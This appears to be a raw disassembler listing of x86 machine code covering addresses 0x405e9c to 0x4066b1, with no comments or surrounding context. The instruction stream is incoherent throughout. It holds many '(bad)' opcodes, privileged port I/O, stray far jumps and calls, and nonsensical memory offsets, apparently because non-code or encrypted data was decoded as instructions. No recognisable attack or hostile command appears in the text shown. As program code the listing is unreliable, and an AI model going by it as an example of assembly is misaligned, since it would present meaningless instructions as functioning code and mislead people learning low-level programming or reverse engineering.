  405e9c:	or     BYTE PTR [edi],bh
  405e9e:	or     eax,0x88d8a7f8
  405ea3:	add    bl,cl
  405ea5:	fwait
  405ea6:	call   0x6c49cad
  405eab:	sub    BYTE PTR [esi],dl
  405ead:	repnz xlat BYTE PTR ds:[bx]
  405eb0:	pop    esi
  405eb1:	pop    ss
  405eb2:	ss repnz out 0x61,eax
  405eb6:	out    dx,eax
  405eb7:	sbb    al,0xae
  405eb9:	jno    0x405ea3
  405ebb:	sub    DWORD PTR [esi+0x3c],eax
  405ebe:	mov    bh,0x1c
  405ec0:	clc    
  405ec1:	cmp    eax,0x3f076242
  405ec6:	stos   DWORD PTR es:[edi],eax
  405ec7:	int    0x57
  405ec9:	pop    eax
  405eca:	cmp    BYTE PTR [eax],bl
  405ecc:	test   al,0xc3
  405ece:	mov    edi,ecx
  405ed0:	push   es
  405ed1:	nop
  405ed2:	xchg   ebx,eax
  405ed3:	and    eax,esi
  405ed5:	mov    ah,0x4
  405ed7:	pushf  
  405ed8:	dec    ebx
  405ed9:	in     eax,0xef
  405edb:	(bad)  [ecx-0x5]
  405ede:	mov    ds:0x6be86285,al
  405ee3:	push   esp
  405ee4:	bound  esi,QWORD PTR [esp+edi*8]
  405ee7:	pop    ebp
  405ee8:	cmp    al,0x32
  405eea:	ss push 0xb53d4114
  405ef0:	adc    edi,DWORD PTR [ecx-0x6d]
  405ef3:	push   eax
  405ef4:	retf   
  405ef5:	add    eax,0x68f0abe8
  405efa:	ficom  DWORD PTR [edx+ecx*2]
  405efd:	pop    esp
  405efe:	imul   ebp,DWORD PTR [edx-0x67f20917],0x2aed2653
  405f08:	fs stc 
  405f0a:	sub    BYTE PTR [edx+ebx*2-0x3d],al
  405f0e:	cld    
  405f0f:	push   es
  405f10:	jl     0x405f74
  405f12:	fdivr  DWORD PTR [edx-0x700e3502]
  405f18:	dec    edi
  405f19:	pop    ds
  405f1a:	int3   
  405f1b:	sbb    eax,0x87045d01
  405f20:	sar    BYTE PTR ds:0xbafcf9aa,1
  405f26:	enter  0x20bf,0x9
  405f2a:	addr16 ja 0x405f5e
  405f2d:	jl     0x405ef3
  405f2f:	pop    ss
  405f30:	aam    0x8d
  405f32:	sub    al,0x51
  405f34:	lods   al,BYTE PTR ds:[esi]
  405f35:	hlt    
  405f36:	jnp    0x405f2c
  405f38:	push   edi
  405f39:	dec    edi
  405f3a:	xor    eax,0x595be851
  405f3f:	push   ebp
  405f40:	out    dx,al
  405f41:	mov    DWORD PTR [esp+ecx*1+0x45],ebp
  405f45:	sub    bh,BYTE PTR [ebx-0xbde7db7]
  405f4b:	pusha  
  405f4c:	daa    
  405f4d:	test   BYTE PTR ds:0x5e25,0x92
  405f53:	addr16 pop ebp
  405f55:	test   dl,dh
  405f57:	call   0xa7127600
  405f5c:	mov    al,0xe6
  405f5e:	shl    BYTE PTR [edi-0x39],cl
  405f61:	xchg   ecx,eax
  405f62:	sar    BYTE PTR [eax],0xf7
  405f65:	cld    
  405f66:	cmp    BYTE PTR [edx-0x57f2ed12],dh
  405f6c:	cmovp  ebp,DWORD PTR [ebp-0x4a5dc71b]
  405f73:	pop    esi
  405f74:	lods   eax,DWORD PTR ds:[esi]
  405f75:	fdiv   DWORD PTR [esi]
  405f77:	xor    WORD PTR [edx-0x7a],sp
  405f7b:	ja     0x405fa8
  405f7d:	jecxz  0x405f3a
  405f7f:	sar    BYTE PTR [edi+0x41],cl
  405f82:	mov    cl,0xc2
  405f84:	xor    ch,BYTE PTR [eax+ebp*2+0x5df3509b]
  405f8b:	fnsave [ebp-0x61]
  405f8e:	mov    es,WORD PTR [eax+eiz*1+0x5f]
  405f92:	xchg   ah,bh
  405f94:	jnp    0x405fc8
  405f96:	mov    dl,0x48
  405f98:	out    dx,al
  405f99:	sahf   
  405f9a:	cmc    
  405f9b:	pop    ds
  405f9c:	nop
  405f9d:	(bad)  
  405f9e:	addr16 mov ebp,0xdff53acf
  405fa4:	and    BYTE PTR [edx+edx*8+0x2c],dh
  405fa8:	sbb    al,0x41
  405faa:	mov    al,ds:0x823da3bc
  405faf:	aam    0x5b
  405fb1:	cli    
  405fb2:	into   
  405fb3:	or     eax,0xb14cde0d
  405fb8:	test   DWORD PTR [eax],0x240be00
  405fbe:	les    ebx,FWORD PTR [ecx]
  405fc0:	sahf   
  405fc1:	inc    eax
  405fc2:	add    DWORD PTR [eax],edi
  405fc4:	xor    al,0xba
  405fc6:	jae    0x406037
  405fc8:	rol    DWORD PTR [ebp-0xf2e73d3],0xed
  405fcf:	or     ecx,DWORD PTR [esi+esi*8+0x6da10df9]
  405fd6:	xchg   ebx,eax
  405fd7:	and    DWORD PTR [edx-0x6d790f9b],esp
  405fdd:	dec    ebx
  405fde:	cmp    eax,0x8754063
  405fe3:	mov    ds:0x15fab9f0,al
  405fe8:	xchg   edx,eax
  405fe9:	cmp    BYTE PTR [edi*1-0x44eb5803],bl
  405ff0:	lods   al,BYTE PTR ds:[esi]
  405ff1:	outs   dx,DWORD PTR ds:[esi]
  405ff2:	dec    ecx
  405ff3:	sub    esp,esi
  405ff5:	jns    0x406057
  405ff7:	mov    al,0xf6
  405ff9:	es dec esi
  405ffb:	mov    ch,0xaa
  405ffd:	or     ecx,DWORD PTR [edi+0x5d02f5eb]
  406003:	loop   0x405fe7
  406005:	lods   eax,DWORD PTR ds:[esi]
  406006:	outs   dx,BYTE PTR ds:[esi]
  406007:	int    0xf5
  406009:	or     BYTE PTR [edi-0x1c],dl
  40600c:	xor    DWORD PTR ds:0x3b1265ca,0x6533a0af
  406016:	sub    al,0x41
  406018:	mov    cl,0x44
  40601a:	fld    st(2)
  40601c:	or     al,0xa7
  40601e:	(bad)  
  40601f:	outs   dx,BYTE PTR ds:[esi]
  406020:	xor    ebp,esp
  406022:	push   es
  406023:	je     0x405fea
  406025:	hlt    
  406026:	sti    
  406027:	arpl   WORD PTR es:[esi+0x71],ax
  40602b:	sbb    al,0xa
  40602d:	test   DWORD PTR [ebx+0x1423f3bb],eax
  406033:	sub    ah,BYTE PTR [ebx-0x212018a3]
  406039:	daa    
  40603a:	sub    ecx,DWORD PTR [edx]
  40603c:	dec    edi
  40603d:	es pushf 
  40603f:	cmp    BYTE PTR [ebx+0x6c084c6f],cl
  406045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406046:	cmp    DWORD PTR [edx+0x24],edi
  406049:	jae    0x40600e
  40604b:	push   0x17
  40604d:	ins    BYTE PTR es:[edi],dx
  40604e:	xchg   ebp,eax
  40604f:	ret    
  406050:	push   ss
  406051:	mov    dh,0xe5
  406053:	icebp  
  406054:	sbb    DWORD PTR [edi],ecx
  406056:	cmp    bh,BYTE PTR [esi-0x62]
  406059:	and    edx,edx
  40605b:	dec    esp
  40605c:	ss mov eax,0x26f95592
  406062:	mov    ch,0x6f
  406064:	mov    es,WORD PTR ds:0xf3d07b1a
  40606a:	add    DWORD PTR [edi+edi*8-0x43],ebp
  40606e:	inc    ecx
  40606f:	das    
  406070:	es out dx,al
  406072:	out    0xe2,al
  406074:	mov    ebx,0x4b502df0
  406079:	jbe    0x40608b
  40607b:	jno    0x406033
  40607d:	iret   
  40607e:	cmp    al,0x93
  406080:	push   ebp
  406081:	pop    edi
  406082:	mov    cl,0xff
  406084:	cmp    bl,BYTE PTR [edx]
  406086:	cmp    al,0x16
  406088:	mov    bh,0x62
  40608a:	push   ds
  40608b:	and    BYTE PTR [ebx],al
  40608d:	scas   eax,DWORD PTR es:[edi]
  40608e:	push   ds
  40608f:	gs or  ecx,edx
  406092:	stos   DWORD PTR es:[edi],eax
  406093:	je     0x406029
  406095:	ja     0x406024
  406097:	ret    0xe681
  40609a:	inc    edx
  40609b:	inc    ecx
  40609c:	cmp    BYTE PTR [esi+0x224f7fcc],0x29
  4060a3:	pop    ebp
  4060a4:	imul   ebx,DWORD PTR [edi-0x1a],0x46053a3e
  4060ab:	and    edx,DWORD PTR [esi]
  4060ad:	dec    esi
  4060ae:	sbb    edi,0x54
  4060b1:	iret   
  4060b2:	je     0x406061
  4060b4:	or     al,0x39
  4060b6:	cmp    esi,DWORD PTR [ebx]
  4060b8:	and    edi,DWORD PTR [eax+0x1c]
  4060bb:	pushf  
  4060bc:	pop    ds
  4060bd:	and    al,0xad
  4060bf:	mov    edi,0x78b57817
  4060c4:	adc    DWORD PTR [ebx-0x7e639579],edx
  4060ca:	add    BYTE PTR [ebx+0x6f0f90af],ch
  4060d0:	icebp  
  4060d1:	pop    esi
  4060d2:	push   ds
  4060d3:	fidivr WORD PTR [eax]
  4060d5:	repz mov ds:0xa28d8333,al
  4060db:	mov    WORD PTR [edx+0x59],?
  4060de:	xchg   ecx,eax
  4060df:	add    DWORD PTR [esi-0x74d40a4b],edx
  4060e5:	jmp    DWORD PTR [eax+0x29e1bd07]
  4060eb:	and    DWORD PTR ds:0x64dbc4d2,ebx
  4060f1:	outs   dx,BYTE PTR ds:[esi]
  4060f2:	pusha  
  4060f3:	js     0x406083
  4060f5:	in     al,dx
  4060f6:	jmp    0x406089
  4060f8:	xchg   ebx,eax
  4060f9:	jb     0x40614b
  4060fb:	mov    edi,0xe732ce
  406100:	fwait
  406101:	sub    ebp,ebx
  406103:	and    DWORD PTR [eax+eax*1+0x19],0x5e2307f0
  40610b:	pop    ebp
  40610c:	int    0xb1
  40610e:	out    0x88,al
  406110:	(bad)  
  406112:	stos   BYTE PTR es:[edi],al
  406113:	xchg   edx,eax
  406114:	inc    esp
  406115:	retf   
  406116:	mov    ecx,0x68e0563d
  40611b:	cli    
  40611c:	lahf   
  40611d:	mov    ?,WORD PTR [eax+0x71ffcf87]
  406123:	inc    edx
  406124:	push   0x5e84e090
  406129:	pop    eax
  40612a:	mov    edi,0xe2bc5efc
  40612f:	push   eax
  406130:	sub    BYTE PTR [ebx-0x28e90767],bh
  406136:	sbb    BYTE PTR [edi],0x17
  406139:	add    bh,BYTE PTR [edi+0x75]
  40613c:	pop    esp
  40613d:	xchg   DWORD PTR [edx+eax*8-0x21],eax
  406141:	sbb    BYTE PTR [eax-0x39754b4e],ah
  406147:	fiadd  DWORD PTR [eax-0x2a]
  40614a:	std    
  40614b:	add    eax,0xb3054818
  406150:	imul   ebx,DWORD PTR [ebp-0x3fd63dfc],0xe2a4b3a1
  40615a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40615b:	or     ebx,DWORD PTR [ecx]
  40615d:	inc    DWORD PTR [edx+0x2486f880]
  406163:	loopne 0x406173
  406165:	out    dx,al
  406166:	push   0xffffffd0
  406168:	cwde   
  406169:	cmp    eax,0x959bbece
  40616e:	retf   
  40616f:	sahf   
  406170:	and    al,0xa8
  406172:	mov    BYTE PTR [esi+0x528d445b],dl
  406178:	fsub   QWORD PTR [ecx]
  40617a:	mov    WORD PTR [esi-0x580392],es
  406180:	push   ds
  406181:	sub    DWORD PTR [eax+0x445919f3],ecx
  406187:	mov    edx,0x917ee488
  40618c:	stc    
  40618d:	xor    ebp,esi
  40618f:	adc    dh,bh
  406191:	arpl   WORD PTR [edi+edi*1],bx
  406194:	(bad)  
  406195:	sbb    eax,0x58405d72
  40619a:	xchg   edi,eax
  40619b:	push   ds
  40619c:	shr    BYTE PTR ds:0x5960463d,cl
  4061a2:	xchg   ebp,eax
  4061a3:	add    eax,0x570e8661
  4061a8:	push   edi
  4061a9:	pop    ecx
  4061aa:	push   ebp
  4061ab:	stos   DWORD PTR es:[edi],eax
  4061ac:	sbb    ebp,esi
  4061ae:	push   eax
  4061af:	add    eax,0x926435ee
  4061b4:	jno    0x4061d8
  4061b6:	and    al,0x68
  4061b8:	inc    esi
  4061b9:	pushf  
  4061ba:	xor    eax,0xf46837c3
  4061bf:	lods   al,BYTE PTR ds:[esi]
  4061c0:	jecxz  0x406156
  4061c2:	bnd jle 0x406216
  4061c5:	inc    ebp
  4061c6:	jo     0x406192
  4061c8:	gs retf 0xe83b
  4061cc:	aas    
  4061cd:	pop    edx
  4061ce:	mov    bl,0xa5
  4061d0:	inc    ebx
  4061d1:	push   eax
  4061d2:	in     al,dx
  4061d3:	stos   BYTE PTR es:[edi],al
  4061d4:	jle    0x40618e
  4061d6:	and    cl,BYTE PTR [edi-0xf]
  4061d9:	test   DWORD PTR [eax],edi
  4061db:	imul   eax,DWORD PTR [eax-0x4d],0xffffff91
  4061df:	daa    
  4061e0:	pusha  
  4061e1:	cmp    eax,0x36536c67
  4061e6:	sub    BYTE PTR [esi],0x84
  4061e9:	outs   dx,BYTE PTR ds:[esi]
  4061ea:	imul   ebx,DWORD PTR [esi+0x5d53639a],0xffffffe7
  4061f1:	lods   al,BYTE PTR ds:[esi]
  4061f2:	xor    BYTE PTR [edi-0x62],bh
  4061f5:	xchg   ecx,eax
  4061f6:	adc    ebx,esp
  4061f8:	leave  
  4061f9:	retf   0xd70f
  4061fc:	fidivr DWORD PTR [edi]
  4061fe:	jle    0x406279
  406200:	iret   
  406201:	lods   eax,DWORD PTR ds:[esi]
  406202:	ret    
  406203:	cli    
  406204:	in     al,0xfe
  406206:	fst    DWORD PTR [esi]
  406208:	stos   DWORD PTR es:[edi],eax
  406209:	scas   eax,DWORD PTR es:[edi]
  40620a:	adc    eax,0x473a4d6d
  40620f:	nop
  406210:	dec    edi
  406211:	and    al,0xfc
  406213:	fwait
  406214:	sbb    eax,0x15376367
  406219:	jge    0x40622c
  40621b:	fidivr DWORD PTR [edx-0x75]
  40621e:	and    DWORD PTR [edi-0x32827259],esp
  406224:	xor    eax,0x703983ba
  406229:	pop    edi
  40622a:	push   esp
  40622b:	add    eax,DWORD PTR [eax-0x2dcb831a]
  406231:	mov    cl,0xb4
  406233:	fst    DWORD PTR [esi]
  406235:	or     al,0x45
  406237:	and    bh,BYTE PTR ds:0xe6418542
  40623d:	cmc    
  40623e:	sub    eax,0x28821112
  406243:	and    cl,ah
  406245:	mul    BYTE PTR [esi+0x53ba97f6]
  40624b:	adc    bl,0xc1
  40624e:	jb     0x406246
  406250:	icebp  
  406251:	in     al,0x17
  406253:	mov    eax,ds:0xfa7a0d95
  406258:	loope  0x406222
  40625a:	jp     0x4062c5
  40625c:	jle    0x406222
  40625e:	mov    ecx,0xdcac4ae
  406263:	add    BYTE PTR ds:0x2a19f63d,bl
  406269:	loopne 0x40623c
  40626b:	arpl   WORD PTR [ecx-0xc],ax
  40626e:	addr16 test ah,dl
  406271:	enter  0xfa52,0x2a
  406275:	cmp    edx,DWORD PTR [esi+edx*2+0x320a3fe9]
  40627c:	jb     0x406211
  40627e:	rcr    DWORD PTR [eax+0x6c],cl
  406281:	pop    es
  406282:	xlat   BYTE PTR ds:[ebx]
  406283:	push   es
  406284:	and    dl,0xa8
  406287:	ja     0x406282
  406289:	push   ecx
  40628a:	xchg   ecx,eax
  40628b:	scas   eax,DWORD PTR es:[edi]
  40628c:	cmp    BYTE PTR [ebp+esi*1+0x7c],0xa4
  406291:	loopne 0x40629d
  406293:	stc    
  406294:	js     0x406291
  406296:	add    al,0xaa
  406298:	bound  eax,QWORD PTR [ebx]
  40629a:	sbb    ch,BYTE PTR [edi+0x2115786d]
  4062a0:	lahf   
  4062a1:	lods   al,BYTE PTR ds:[esi]
  4062a2:	sub    eax,0x3768f4f7
  4062a7:	inc    ebp
  4062a8:	dec    edx
  4062a9:	stos   BYTE PTR es:[edi],al
  4062aa:	lods   eax,DWORD PTR ds:[esi]
  4062ab:	push   esi
  4062ac:	mov    bh,0x7b
  4062ae:	mov    dh,0x49
  4062b0:	xlat   BYTE PTR ds:[ebx]
  4062b1:	push   edi
  4062b2:	das    
  4062b3:	ss cdq 
  4062b5:	dec    edi
  4062b6:	sub    eax,0x1a009b92
  4062bb:	sar    ebp,cl
  4062bd:	jmp    0x8f72:0x46c1be9e
  4062c4:	add    al,0x2a
  4062c6:	or     BYTE PTR [ebx-0x7bb86c78],dl
  4062cc:	xchg   ecx,eax
  4062cd:	dec    esi
  4062ce:	mov    ds:0xf0b31d93,eax
  4062d3:	xor    ebp,edi
  4062d5:	inc    ebx
  4062d6:	call   0x4624213a
  4062db:	and    al,0x8e
  4062dd:	lea    esp,[edi]
  4062df:	sbb    esp,ecx
  4062e1:	lods   al,BYTE PTR ds:[esi]
  4062e2:	xchg   DWORD PTR [eax-0x102a0749],ebp
  4062e8:	adc    BYTE PTR [ebp-0x3a1e8d6d],ah
  4062ee:	jbe    0x406346
  4062f0:	je     0x40629b
  4062f2:	imul   edi,DWORD PTR [bx+si-0x4f],0x44c07bb2
  4062fa:	dec    ecx
  4062fb:	repz dec edx
  4062fd:	cmp    eax,esp
  4062ff:	test   DWORD PTR [edx+esi*1-0x3b99daec],edx
  406306:	hlt    
  406307:	xor    BYTE PTR [ecx-0x1e1d5c1b],al
  40630d:	xor    al,0xa5
  40630f:	jmp    0x4062a6
  406311:	or     al,0x4f
  406313:	(bad)  
  406315:	sub    bl,bl
  406317:	call   0xaa9b:0x51101158
  40631e:	fwait
  40631f:	dec    esi
  406320:	jmp    0xa17dfa6b
  406325:	push   ds
  406326:	aas    
  406327:	push   edx
  406328:	iret   
  406329:	pop    edi
  40632a:	clc    
  40632b:	mov    ch,0xff
  40632d:	ss mov ebx,0xf9ce20f3
  406333:	shr    BYTE PTR [ebp-0x37],cl
  406336:	inc    eax
  406337:	scas   eax,DWORD PTR es:[edi]
  406338:	enter  0xb7c4,0xfa
  40633c:	xchg   edi,eax
  40633d:	call   0x2b54:0x4691eca2
  406344:	fdiv   st,st(4)
  406346:	cmp    ecx,ebx
  406348:	cmp    eax,0x574030a3
  40634d:	xor    eax,0xed27e00d
  406352:	jnp    0x40635d
  406354:	aas    
  406355:	pop    ds
  406356:	mov    ah,BYTE PTR [eax-0x4]
  406359:	add    BYTE PTR [edx],bl
  40635b:	xor    DWORD PTR [edi+ebp*8+0x21],eax
  40635f:	or     eax,0x34a39cd7
  406364:	hlt    
  406365:	xchg   ebx,eax
  406366:	ins    BYTE PTR es:[edi],dx
  406367:	inc    edx
  406368:	call   0xaff43f66
  40636d:	imul   edx,edi,0x79b3bdd8
  406373:	clc    
  406374:	pop    es
  406375:	fdiv   QWORD PTR [esi-0x60]
  406378:	mov    bl,0x12
  40637a:	aam    0x19
  40637c:	xor    eax,0x89e57fa2
  406381:	inc    edx
  406382:	jmp    0x9f94:0x611d8f93
  406389:	ss cmc 
  40638b:	iret   
  40638c:	sbb    dh,ah
  40638e:	addr16 loopne 0x40634e
  406391:	aam    0xc5
  406393:	sbb    bh,dl
  406395:	loopne 0x4063bc
  406397:	mov    ebx,0xef2e42b3
  40639c:	xchg   edx,eax
  40639d:	push   esi
  40639e:	stos   BYTE PTR es:[edi],al
  40639f:	xor    esi,DWORD PTR [esi+ecx*4]
  4063a2:	or     BYTE PTR [esi+0x343d29e7],al
  4063a8:	mov    dl,0xe6
  4063aa:	lods   eax,DWORD PTR ds:[esi]
  4063ab:	mov    bl,0xfe
  4063ad:	sti    
  4063ae:	push   es
  4063af:	leave  
  4063b0:	add    DWORD PTR [esi+0x409d6006],esi
  4063b6:	sub    ebp,DWORD PTR [edi]
  4063b8:	repz jl 0x40633c
  4063bb:	add    ah,BYTE PTR [eax-0x49d7f371]
  4063c1:	pushf  
  4063c2:	pop    ecx
  4063c3:	jp     0x40635c
  4063c5:	dec    eax
  4063c6:	pop    ebp
  4063c7:	hlt    
  4063c8:	imul   ecx,DWORD PTR [ecx],0xffffffb3
  4063cb:	mov    bl,0x8f
  4063cd:	ror    BYTE PTR [ebp+0x3e],1
  4063d0:	(bad)  
  4063d1:	adc    ch,ah
  4063d3:	stos   DWORD PTR es:[edi],eax
  4063d4:	mov    esi,0x4bb6b299
  4063d9:	loop   0x4063bd
  4063db:	push   0x52
  4063dd:	jecxz  0x4063af
  4063df:	sbb    cl,BYTE PTR [ecx]
  4063e1:	out    dx,al
  4063e2:	mov    al,0x63
  4063e4:	xor    dl,0x5d
  4063e7:	sbb    ebp,0xd2515b93
  4063ed:	mov    ds:0x4e537187,al
  4063f2:	jle    0x4063ae
  4063f4:	inc    BYTE PTR [edi+0x1b]
  4063f7:	sar    BYTE PTR [edx+0x401fa140],0x15
  4063fe:	jle    0x4063a0
  406400:	mov    DWORD PTR [edx+ebx*1+0x16],edi
  406404:	cmp    eax,0x7143eeca
  406409:	add    edi,edx
  40640b:	sbb    bl,BYTE PTR [edi-0xbb95a7c]
  406411:	test   eax,0x49fb46c2
  406416:	in     eax,0xbb
  406418:	cmp    dh,bh
  40641a:	enter  0x5b84,0x86
  40641e:	and    BYTE PTR [edi*4+0x5e4d5233],bh
  406425:	fsub   st(0),st
  406427:	mov    ebp,0x8ba2d9d
  40642c:	or     ebp,DWORD PTR [ecx+0x442cb929]
  406432:	xchg   ecx,eax
  406433:	mov    ch,0xdc
  406435:	sub    eax,0x31756bcf
  40643a:	mov    ch,0x88
  40643c:	add    dh,cl
  40643e:	addr16 out dx,al
  406440:	imul   DWORD PTR [edi]
  406442:	pop    ss
  406443:	jecxz  0x4064c0
  406445:	ss mov bh,0xe2
  406448:	pop    ebx
  406449:	xor    al,0x46
  40644b:	out    0xbb,al
  40644d:	imul   edx,DWORD PTR [ecx-0x38caea72],0xa753126e
  406457:	lds    esp,FWORD PTR [esi+0x34]
  40645a:	cld    
  40645b:	mov    eax,ds:0x29c73c7d
  406460:	adc    DWORD PTR [ecx],ecx
  406462:	ror    DWORD PTR [ecx+0x6cbcfe69],0xc1
  406469:	ror    DWORD PTR [ecx+0x35495609],1
  40646f:	mov    cl,0x77
  406471:	adc    esi,DWORD PTR [edi]
  406473:	inc    ebp
  406474:	(bad)  
  406476:	imul   ecx,ebp,0x8d0c4e71
  40647c:	fadd   DWORD PTR ds:0xfc5a4f8c
  406482:	xor    al,0x8f
  406484:	adc    edi,esi
  406486:	shr    BYTE PTR [ecx-0x6376495f],cl
  40648c:	aam    0x9d
  40648e:	sbb    BYTE PTR [esi],ch
  406490:	adc    bl,BYTE PTR [esi]
  406492:	xchg   BYTE PTR [ecx+ecx*1],ah
  406495:	pop    ebx
  406496:	lock imul eax
  406499:	lea    edi,[eax]
  40649b:	mov    bh,0x4e
  40649d:	add    al,0x8c
  40649f:	sar    BYTE PTR [edx+0x4],1
  4064a2:	and    BYTE PTR [ecx-0x3d],dh
  4064a5:	pop    eax
  4064a6:	sti    
  4064a7:	lahf   
  4064a8:	xor    edi,DWORD PTR [bp+di]
  4064ab:	mov    edi,0xc54d491d
  4064b0:	cld    
  4064b1:	pop    ebx
  4064b2:	fs in  al,dx
  4064b4:	jmp    0x5d0f:0x724976fe
  4064bb:	jl     0x4064bb
  4064bd:	or     al,0xd1
  4064bf:	cld    
  4064c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c1:	repz int 0x53
  4064c4:	inc    eax
  4064c5:	inc    edi
  4064c6:	mov    cl,0x7a
  4064c8:	adc    dh,BYTE PTR gs:[ecx+0x77]
  4064cc:	dec    esi
  4064cd:	jb     0x4064c1
  4064cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d0:	adc    eax,0xed5812a0
  4064d5:	sbb    edi,DWORD PTR [eax+0x26]
  4064d8:	push   cs
  4064d9:	xor    DWORD PTR [edx-0x7d],0xce43ecd9
  4064e0:	imul   edi,DWORD PTR ds:0x5422e78e,0x4b7ece31
  4064ea:	push   ebp
  4064eb:	repnz popa 
  4064ed:	neg    DWORD PTR [ecx+0x50]
  4064f0:	mov    al,0x41
  4064f2:	jbe    0x40651d
  4064f4:	hlt    
  4064f5:	rol    ah,1
  4064f7:	jne    0x40647f
  4064f9:	into   
  4064fa:	push   ebx
  4064fb:	nop
  4064fc:	mul    BYTE PTR [ecx-0x3]
  4064ff:	xor    cl,BYTE PTR [edi-0x5cd12ba9]
  406505:	dec    ebp
  406506:	inc    eax
  406507:	xor    BYTE PTR [ebx-0x3628b2ce],dh
  40650d:	cmp    bh,cl
  40650f:	outs   dx,DWORD PTR ds:[esi]
  406510:	loopne 0x406536
  406512:	or     esi,DWORD PTR [edi+ebx*1+0x38]
  406516:	stos   DWORD PTR es:[edi],eax
  406517:	and    eax,0xe8442ab7
  40651c:	mov    dh,0x60
  40651e:	sti    
  40651f:	jb     0x406536
  406521:	push   edx
  406522:	sub    eax,0x96cc3671
  406527:	jp     0x40650e
  406529:	mov    ebx,0x2e8cdf90
  40652e:	jge    0x4065a5
  406530:	push   ebx
  406531:	jle    0xbe96590b
  406537:	jns    0x406549
  406539:	or     BYTE PTR [ebx-0x7a7eb93c],cl
  40653f:	pop    ebx
  406540:	icebp  
  406541:	(bad)  
  406542:	loop   0x406522
  406544:	(bad)  
  406545:	pop    ss
  406546:	cmc    
  406547:	mov    bl,0x5c
  406549:	std    
  40654a:	retf   0x5a45
  40654d:	in     al,0x9f
  40654f:	shl    ebp,0xa8
  406552:	mov    ebp,0xcce12ae2
  406557:	jnp    0x40655a
  406559:	dec    ecx
  40655a:	dec    edi
  40655b:	inc    ebx
  40655c:	(bad)  
  40655d:	into   
  40655e:	out    dx,al
  40655f:	mov    bh,0x3e
  406561:	fdiv   st,st(6)
  406563:	xchg   esp,eax
  406564:	mov    cl,0xd0
  406566:	and    esp,DWORD PTR [ecx+eiz*8-0xec17166]
  40656d:	xchg   ecx,eax
  40656e:	push   0xffffffb5
  406570:	or     dh,BYTE PTR [ebp-0x62]
  406573:	retf   
  406574:	inc    esi
  406575:	dec    ebx
  406576:	fistp  WORD PTR [edi+edi*2]
  406579:	adc    BYTE PTR ds:0xf1b92223,ah
  40657f:	clc    
  406580:	sti    
  406581:	stos   BYTE PTR es:[edi],al
  406582:	js     0x40653e
  406584:	cmp    al,0xd8
  406586:	mov    esi,0x457ebea3
  40658b:	add    eax,0x7700dc41
  406590:	cs mov ecx,0x8e0e0a18
  406596:	shl    DWORD PTR [ecx],cl
  406598:	das    
  406599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40659a:	loop   0x406603
  40659c:	pop    DWORD PTR [edi-0x61599cb8]
  4065a2:	xor    bh,BYTE PTR [eax+0x3d]
  4065a5:	jg     0x40656b
  4065a7:	popf   
  4065a8:	sub    eax,0x88f9ddec
  4065ad:	mov    cs,WORD PTR [ebx+0x6344d997]
  4065b3:	rol    ch,0x12
  4065b6:	adc    al,0xa1
  4065b8:	mov    ?,WORD PTR [edx-0x2802c0a3]
  4065be:	jno    0x406570
  4065c0:	sub    eax,0x1d91c713
  4065c5:	push   ebx
  4065c6:	test   al,0x3a
  4065c8:	enter  0x7132,0x62
  4065cc:	pop    eax
  4065cd:	cmp    eax,0x2e7a4093
  4065d2:	xchg   esp,eax
  4065d3:	jmp    0xf5fe0cd8
  4065d8:	adc    DWORD PTR [ecx],eax
  4065da:	ja     0x4065bb
  4065dc:	(bad)  
  4065dd:	retf   
  4065de:	jecxz  0x406650
  4065e0:	repz cmp eax,0xf84e42a8
  4065e6:	dec    ebp
  4065e7:	jle    0x406571
  4065e9:	fs mov bl,0x8f
  4065ec:	test   cl,dh
  4065ee:	sbb    ebx,DWORD PTR [edx+0x39217f6f]
  4065f4:	jno    0x4065fb
  4065f6:	push   edi
  4065f7:	es nop
  4065f9:	xchg   BYTE PTR [esi+ebx*4+0x60],ch
  4065fd:	pop    edx
  4065fe:	lea    eax,[esi+0x75226c99]
  406604:	xor    eax,esp
  406606:	xor    eax,0xf97c5a12
  40660b:	and    ah,BYTE PTR [ebp-0x49]
  40660e:	or     BYTE PTR [edi],bh
  406610:	dec    ebx
  406611:	mov    eax,ds:0x488df63
  406616:	mov    edx,DWORD PTR [edi+0x7d355a5e]
  40661c:	outs   dx,DWORD PTR ds:[esi]
  40661d:	xchg   ecx,eax
  40661e:	mov    esi,0xd172b0fa
  406623:	aas    
  406624:	test   eax,0xb24ad071
  406629:	frstor [ebp-0x55]
  40662c:	lds    esp,FWORD PTR [edx+eax*1-0x2fbe589f]
  406633:	fbld   TBYTE PTR [ebp+0x7c]
  406636:	dec    DWORD PTR [eax-0x38]
  406639:	mov    esi,0x178341fb
  40663e:	dec    ecx
  40663f:	inc    ebx
  406640:	xchg   edi,eax
  406641:	mov    ebx,0x36265211
  406646:	jns    0x406605
  406648:	add    ch,dh
  40664a:	sub    eax,0x67a29f35
  40664f:	mov    edi,0xa8ee0596
  406654:	or     BYTE PTR [esi+0x11a43f0d],bl
  40665a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40665b:	loop   0x406608
  40665d:	dec    esp
  40665e:	sub    al,BYTE PTR [ebx-0xc992920]
  406664:	out    0xc6,al
  406666:	inc    esi
  406667:	pop    ds
  406668:	aad    0x29
  40666a:	adc    eax,0x6fc01f2b
  40666f:	test   al,0xdf
  406671:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  406673:	cdq    
  406674:	daa    
  406675:	dec    ecx
  406676:	fadd   st,st(4)
  406678:	cmc    
  406679:	adc    al,0x1d
  40667b:	mov    bl,0x24
  40667d:	imul   esi,DWORD PTR [ecx+0x55],0x9ae5c041
  406684:	js     0x4066ff
  406686:	pop    ecx
  406687:	add    DWORD PTR [esi],ebp
  406689:	cmp    bh,bh
  40668b:	mov    dl,0x22
  40668d:	adc    dh,BYTE PTR [ebx]
  40668f:	xor    dh,BYTE PTR [ecx-0x14]
  406692:	jbe    0x40666f
  406694:	jecxz  0x4066e2
  406696:	loope  0x406665
  406698:	mov    edi,ebp
  40669a:	xor    BYTE PTR [esi+0x15],ah
  40669d:	add    eax,0xbe2637a1
  4066a2:	aad    0xf7
  4066a4:	outs   dx,DWORD PTR ds:[esi]
  4066a5:	or     cl,bl
  4066a7:	dec    esi
  4066a8:	imul   esi,DWORD PTR [edi+ebp*1-0x15],0x68c23834
  4066b0:	xchg   ecx,eax
  4066b1:	test   eax,0x6e34d9b4
